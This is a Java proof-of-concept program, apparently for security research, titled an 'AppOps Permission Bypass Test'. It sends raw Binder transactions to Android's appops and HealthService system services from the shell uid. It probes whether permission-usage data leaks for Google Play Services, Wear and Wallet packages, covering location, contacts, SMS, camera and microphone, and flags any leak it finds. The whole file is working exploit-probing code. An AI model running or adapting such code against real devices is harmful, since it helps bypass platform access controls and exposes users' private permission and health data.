import android.os.IBinder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class AppOpsTest {
    public static void main(String[] args) throws Exception {
        System.out.println("=== AppOps Permission Bypass Test (shell uid) ===");
        System.out.println("UID: " + android.os.Process.myUid());
        System.out.println("PID: " + android.os.Process.myPid());

        Class<?> sm = Class.forName("android.os.ServiceManager");
        Method gs = sm.getMethod("getService", String.class);

        IBinder appops = (IBinder) gs.invoke(null, "appops");
        if (appops == null) {
            System.out.println("ERROR: appops service not found");
            return;
        }
        System.out.println("appops interface: " + appops.getInterfaceDescriptor());

        String[] targets = {
            "com.google.android.gms",
            "com.google.wear.services",
            "com.google.android.wearable.app",
            "com.google.android.apps.walletnfcrel"
        };

        // Get UIDs for targets via package manager service
        IBinder pm = (IBinder) gs.invoke(null, "package");

        for (String pkg : targets) {
            int uid = getUidForPackage(pm, pkg);
            if (uid < 0) {
                System.out.println(pkg + ": not installed");
                continue;
            }
            System.out.println("\n--- " + pkg + " (uid=" + uid + ") ---");

            // Transaction 3 = getOpsForPackage
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.android.internal.app.IAppOpsService");
                data.writeInt(uid);
                data.writeString(pkg);
                data.writeInt(-1); // null ops array
                boolean ok = appops.transact(3, data, reply, 0);
                reply.setDataPosition(0);
                try {
                    reply.readException();
                    int avail = reply.dataAvail();
                    System.out.println("  txn3 avail=" + avail);
                    if (avail > 0) {
                        int listSize = reply.readInt();
                        System.out.println("  listSize=" + listSize);
                        if (listSize > 0) {
                            System.out.println("  *** LEAKED " + listSize + " entries! ***");
                            // Read first few entries for detail
                            for (int i = 0; i < Math.min(listSize, 5); i++) {
                                int op = reply.readInt();
                                System.out.println("    op[" + i + "]=" + op + " (" + opName(op) + ")");
                            }
                        }
                    }
                } catch (SecurityException se) {
                    System.out.println("  SecurityException: " + se.getMessage());
                } catch (Exception e) {
                    System.out.println("  Exception: " + e.getClass().getSimpleName() + ": " + e.getMessage());
                }
            } finally {
                data.recycle();
                reply.recycle();
            }

            // Transaction 4 = getPackagesForOps
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken("com.android.internal.app.IAppOpsService");
                int[] ops = {0, 1, 2, 4, 5, 6, 14, 20, 26, 27, 56}; // location, contacts, sms, camera, mic, sensors
                data.writeInt(ops.length);
                for (int op : ops) data.writeInt(op);
                boolean ok = appops.transact(4, data, reply, 0);
                reply.setDataPosition(0);
                try {
                    reply.readException();
                    int avail = reply.dataAvail();
                    System.out.println("  txn4 (getPackagesForOps) avail=" + avail);
                    if (avail > 0) {
                        int sz = reply.readInt();
                        System.out.println("  returned " + sz + " packages");
                        if (sz > 0) {
                            System.out.println("  *** LEAKED package ops data! ***");
                        }
                    }
                } catch (SecurityException se) {
                    System.out.println("  txn4 SecurityException: " + se.getMessage());
                } catch (Exception e) {
                    System.out.println("  txn4 Exception: " + e.getMessage());
                }
            } finally {
                data.recycle();
                reply.recycle();
            }
        }

        // Also test HealthService
        System.out.println("\n=== HealthService Data Leak Test ===");
        IBinder health = (IBinder) gs.invoke(null, "IHealthService");
        if (health != null) {
            System.out.println("HealthService interface: " + health.getInterfaceDescriptor());
            for (int txn = 1; txn <= 5; txn++) {
                Parcel data = Parcel.obtain();
                Parcel reply = Parcel.obtain();
                try {
                    data.writeInterfaceToken(health.getInterfaceDescriptor());
                    health.transact(txn, data, reply, 0);
                    reply.setDataPosition(0);
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        System.out.println("  txn" + txn + ": " + avail + " bytes");
                    } catch (Exception e) {
                        System.out.println("  txn" + txn + ": " + e.getMessage());
                    }
                } finally {
                    data.recycle();
                    reply.recycle();
                }
            }
        } else {
            System.out.println("HealthService not found");
        }

        System.out.println("\n=== Done ===");
    }

    static int getUidForPackage(IBinder pm, String pkg) {
        try {
            // Use cmd to get the UID
            Process p = Runtime.getRuntime().exec(new String[]{
                "cmd", "package", "list", "packages", "-U", pkg
            });
            java.io.BufferedReader br = new java.io.BufferedReader(
                new java.io.InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains(pkg) && line.contains("uid:")) {
                    int idx = line.lastIndexOf("uid:");
                    return Integer.parseInt(line.substring(idx + 4).trim());
                }
            }
        } catch (Exception e) {
            // fall through
        }
        return -1;
    }

    static String opName(int op) {
        String[] names = {
            "COARSE_LOCATION", "FINE_LOCATION", "GPS", "VIBRATE",
            "READ_CONTACTS", "WRITE_CONTACTS", "READ_CALL_LOG", "WRITE_CALL_LOG",
            "READ_CALENDAR", "WRITE_CALENDAR", "WIFI_SCAN", "POST_NOTIFICATION",
            "NEIGHBORING_CELLS", "CALL_PHONE", "READ_SMS", "WRITE_SMS",
            "RECEIVE_SMS", "RECEIVE_EMERGECY_SMS", "RECEIVE_MMS", "RECEIVE_WAP_PUSH",
            "SEND_SMS", "READ_ICC_SMS", "WRITE_ICC_SMS", "WRITE_SETTINGS",
            "SYSTEM_ALERT_WINDOW", "ACCESS_NOTIFICATIONS", "CAMERA", "RECORD_AUDIO"
        };
        if (op >= 0 && op < names.length) return names[op];
        return "OP_" + op;
    }
}
